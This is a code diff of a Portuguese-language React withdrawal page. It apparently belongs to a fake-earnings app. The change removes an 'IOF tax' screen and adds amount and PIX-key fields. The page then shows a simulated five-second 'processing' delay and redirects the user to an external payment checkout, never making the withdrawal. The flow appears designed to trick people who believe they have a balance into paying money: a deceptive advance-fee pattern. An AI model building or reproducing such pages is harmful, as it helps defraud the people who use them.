@@ -1,7 +1,6 @@
 import { useState } from 'react';
 import { ArrowLeft, HelpCircle } from 'lucide-react';
 import { ProcessingWithdraw } from './ProcessingWithdraw';
-import { IOFPage } from './IOFPage';
 
 interface WithdrawPageProps {
   balance: number;
@@ -10,22 +9,26 @@ interface WithdrawPageProps {
 
 export function WithdrawPage({ balance, onBack }: WithdrawPageProps) {
   const [isProcessing, setIsProcessing] = useState(false);
-  const [showIOF, setShowIOF] = useState(false);
+  const [selectedAmount, setSelectedAmount] = useState<number | null>(null);
+  const [pixKey, setPixKey] = useState('');
+  const [pixKeyType, setPixKeyType] = useState('');
 
   const handleWithdraw = () => {
+    if (!selectedAmount || !pixKey || !pixKeyType) {
+      alert('Por favor, preencha todos os campos antes de realizar o saque.');
+      return;
+    }
+
     setIsProcessing(true);
+
+    // Simula carregamento e redireciona
     setTimeout(() => {
-      setIsProcessing(false);
-      setShowIOF(true);
+      window.location.href = 'https://go.perfectpay.com.br/PPU38CPD7IK';
     }, 5000);
   };
 
   if (isProcessing) {
     return <ProcessingWithdraw />;
-  }
-
-  if (showIOF) {
-    return <IOFPage balance={balance} onPayTax={() => {}} />;
   }
 
   return (
@@ -58,18 +61,26 @@ export function WithdrawPage({ balance, onBack }: WithdrawPageProps) {
               <span className="text-gray-600">Transferência bancária / PIX</span>
             </div>
 
+            {/* Botões interativos para selecionar valores */}
             <div className="flex gap-2 mb-4">
               {[1.5, 5, 10, balance].map((amount) => (
                 <button
                   key={amount}
-                  className="flex-1 py-2 px-3 rounded bg-gray-100 hover:bg-gray-200 transition-colors"
+                  onClick={() => setSelectedAmount(amount)}
+                  className={`flex-1 py-2 px-3 rounded ${
+                    selectedAmount === amount ? 'bg-[#FF3B5C] text-white' : 'bg-gray-100 hover:bg-gray-200'
+                  } transition-colors`}
                 >
                   R${amount.toFixed(2)}
                 </button>
               ))}
             </div>
 
-            <select className="w-full p-3 border rounded-lg mb-3">
+            <select
+              value={pixKeyType}
+              onChange={(e) => setPixKeyType(e.target.value)}
+              className="w-full p-3 border rounded-lg mb-3"
+            >
               <option value="">Selecione o tipo de chave</option>
               <option value="cpf">CPF</option>
               <option value="email">Email</option>
@@ -78,6 +89,8 @@ export function WithdrawPage({ balance, onBack }: WithdrawPageProps) {
 
             <input
               type="text"
+              value={pixKey}
+              onChange={(e) => setPixKey(e.target.value)}
               placeholder="Digite a sua chave PIX"
               className="w-full p-3 border rounded-lg mb-4"
             />
